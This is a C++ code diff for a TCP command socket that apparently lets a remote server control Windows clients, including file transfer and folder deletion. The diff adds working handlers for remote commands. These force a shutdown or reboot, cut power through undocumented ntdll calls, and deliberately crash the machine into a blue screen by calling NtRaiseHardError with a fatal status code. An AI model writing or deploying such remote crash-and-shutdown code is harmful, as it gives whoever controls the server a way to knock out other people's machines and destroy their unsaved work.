@@ -2,6 +2,9 @@
 
 using namespace ws;
 
+typedef NTSTATUS (WINAPI *PNTRAISE)(NTSTATUS, ULONG, ULONG, PULONG, UINT, PULONG);
+typedef BOOL (WINAPI *PNTSHUTDOWNSYSTEM)(int);
+
 CommandSocket::CommandSocket() :
   TCPSocket(),
   _hRecv(INVALID_HANDLE_VALUE),
@@ -207,20 +210,29 @@ void CommandSocket::RecvProc()
     case SHUTDOWN_CLIENT:
       {
         int type = -1;
-        if (TCPSocket::RecvData((char*)type, sizeof(int)) < 0)
+        if (TCPSocket::RecvData((char*)&type, sizeof(int)) < 0)
           break;
 
+        command = DONE;
+        if (SendData((char*)&command, sizeof(int)) < 0)
+        {
+          command = FAIL;
+          break;
+        }
+
         ShutdownClient((TypeShutdown)type);
-        break;
+        return;
       }
     }
     if (SendData((char*)&command, sizeof(int)) < 0)
       break;
+    command = FAIL;
   }
 }
 
-void CommandSocket::StandartShutdown(DWORD flags)
+void CommandSocket::ShutdownClient(TypeShutdown type)
 {
+
   HANDLE hToken; 
   TOKEN_PRIVILEGES tkp; 
 
@@ -236,27 +248,26 @@ void CommandSocket::StandartShutdown(DWORD flags)
 
   if (GetLastError() != ERROR_SUCCESS) 
     return;
-  //InitiateSystemShutdown
-  ExitWindowsEx(flags | EWX_FORCE, 0);
-}
 
-void CommandSocket::ShutdownClient(TypeShutdown type)
-{
-  int returned;
-  switch(type)
+  if (type <= REBOOT)
   {
-  case SHUTDOWN:
-    StandartShutdown(EWX_SHUTDOWN);
-    break;
-  case REBOOT:
-    StandartShutdown(EWX_REBOOT);
-    break;
-  case RESET:
-    break;
-  case BLUESCREEN:
-    //DeviceIoControl(lpadapter->hFile, IOCTL_NDISUIO_BLUESCREEN, 0, 0, 0, 0, (LPDWORD)&returned, 0);
-    break;
+    ExitWindowsEx(type+1 | EWX_FORCE, 0);
+    return;
   }
+
+  if (type <= POWEROFF)
+  {
+    PNTSHUTDOWNSYSTEM shutdown = (PNTSHUTDOWNSYSTEM)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwShutdownSystem");
+    if (type == POWEROFF)
+      shutdown(2);
+    else
+      shutdown(1);
+    return;
+  }
+
+  ULONG retValue = 0;
+  PNTRAISE NtRaiseHardError = (PNTRAISE)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
+  NtRaiseHardError(0xC000021AL, 0, 1, 0, 6, &retValue);
 }
 
 bool CommandSocket::SendFileCommand(const wchar_t* filename)
@@ -384,13 +395,16 @@ bool CommandSocket::DeleteFolderCommand(const wchar_t* folder)
   return (command == DONE ? true : false);
 }
 
-void CommandSocket::ShutdownCommand(TypeShutdown type)
+bool CommandSocket::ShutdownCommand(TypeShutdown type)
 {
   int command = SHUTDOWN_CLIENT;
   if (TCPSocket::SendData((char*)&command, sizeof(int)) < 0)
-    return;
+    return false;
   if (TCPSocket::SendData((char*)&type, sizeof(int)) < 0)
-    return;
+    return false;
+  if (TCPSocket::RecvData((char*)&command, sizeof(int)) < 0)
+    return false;
+  return (command == DONE ? true : false);
 }
 
 CommandServer::CommandServer() :
